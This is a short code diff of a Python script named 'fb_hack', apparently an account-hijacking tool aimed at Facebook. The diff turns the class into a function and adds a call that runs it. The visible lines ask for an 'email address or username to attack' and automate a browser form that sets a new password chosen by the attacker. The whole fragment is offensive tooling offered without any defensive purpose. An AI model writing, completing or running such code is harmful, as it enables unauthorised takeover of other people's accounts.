@@ -122,17 +122,8 @@ elif check2 != test:
       z = 1
 else:
   response1 = browser.response()
-  soup = BeautifulSoup(response1, 'html.parser')
-  print(soup.find(string="password_new"))
-  yes = input('Continue/Exit? ')
-  if yes == 'n':
-    exit()
-  else:
-    new = input('New Password: ')
-    browser.select_form(nr=0)
-    browser.form['password_new'] = new
-  """browser.form['n'] = x"""
-class fb_hack(object):
+
+def fb_hack():
   os.system('clear')
   soup = BeautifulSoup()
   email = input('Email address or username to attack:')
@@ -220,3 +211,4 @@ class fb_hack(object):
       new = input('New Password: ')
       browser.select_form(nr=0)
       browser.form['password_new'] = new
+fb_hack()
